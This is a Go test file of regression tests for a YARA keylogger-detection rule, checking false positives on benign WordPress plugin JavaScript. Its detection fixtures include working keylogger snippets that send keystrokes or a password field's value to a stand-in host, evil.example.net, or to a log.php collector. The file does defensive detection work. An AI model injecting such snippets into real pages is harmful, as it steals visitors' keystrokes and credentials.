//go:build yara

package yara

import "testing"

// Regression tests for the 2026-07-24 exfil_keylogger_js false positives on
// stock minified plugin bundles (Yoast SEO general-page.js). Minified JavaScript
// puts thousands of unrelated statements between semicolons, so correlating a
// key handler with any later network call over a byte window spanning unrelated
// code reports ordinary plugin behaviour as a keylogger. A keylogger must send
// data derived from the captured keystroke, not any form field the bundle reads.

// yoastBundleShape reproduces the real FP: an accessibility keydown handler that
// only calls preventDefault, and a completely unrelated newsletter subscribe
// fetch whose callback later reads an input's .value.
const yoastBundleShape = `).id&&"INPUT"===e.target.tagName&&e.preventDefault()}return addEventListener("keydown",e),` +
	`()=>removeEventListener("keydown",e)}),[]),(0,l.useCallback)((e=>fetch("https://my.yoast.com/api/Mailing-list/subscribe",` +
	`{method:"POST",mode:"cors",cache:"no-cache",credentials:"same-origin",headers:{"Content-Type":"application/json"},` +
	`redirect:"follow",referrerPolicy:"no-referrer",body:JSON.stringify({customerDetails:{firstName:"",email:e},` +
	`list:"Yoast newsletter",source:"free"})})).json()}(r)).error?(s("error"),i(ad)):(s("success"),i(od))}),[r]),` +
	`u=(0,l.useCallback)((e=>{s("waiting"),n(e.target.value)}),[])`

func TestFPKeylogger_StockPluginBundle(t *testing.T) {
	s := loadRepoYaraScanner(t)
	if hasYaraRule(s.ScanBytes([]byte(yoastBundleShape)), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js FP: matched stock Yoast bundle (accessibility keydown handler + unrelated newsletter fetch)")
	}
}

// A cache-busting analytics bundle that binds keyup for a search-as-you-type box
// and posts the search term. The posted value is the input's own .value, not the
// keystroke, and the handler is a legitimate site feature.
func TestFPKeylogger_SearchAsYouTypeBundle(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`e.addEventListener("keyup",function(){var q=document.getElementById("s")` +
		`,r=new XMLHttpRequest;r.open("POST","/wp-admin/admin-ajax.php"),r.send("action=search&term="+q.value)})`)
	if hasYaraRule(s.ScanBytes(legit), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js FP: matched search-as-you-type widget posting its own input value")
	}
}

// Real keylogger: the captured keystroke itself is buffered and shipped out.
func TestFPKeylogger_RealKeystrokeExfilStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`var b="";document.addEventListener("keydown",function(e){b+=String.fromCharCode(e.keyCode);` +
		`fetch("https://evil.example.net/c",{method:"POST",body:b})});`)
	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: keystroke buffer exfiltrated to external host not detected")
	}
}

func TestFPKeylogger_RealKeystrokeBeaconStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`window.onkeypress=function(e){navigator.sendBeacon("/wp-content/uploads/log.php","k="+e.key)};`)
	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: keystroke beacon to same-origin collector not detected")
	}
}

func TestFPKeylogger_RealKeystrokeImageExfilStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`document.onkeyup=function(e){var i=new Image;i.src="https://evil.example.net/p?c="+e.charCode};`)
	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: keystroke image-pixel exfil not detected")
	}
}

func TestFPKeylogger_CredentialFieldExfilStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`document.onkeyup=function(){var i=new Image;i.src="https://evil.example.net/p?c="+document.getElementById("password").value};`)
	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: credential-field exfil not detected")
	}
}
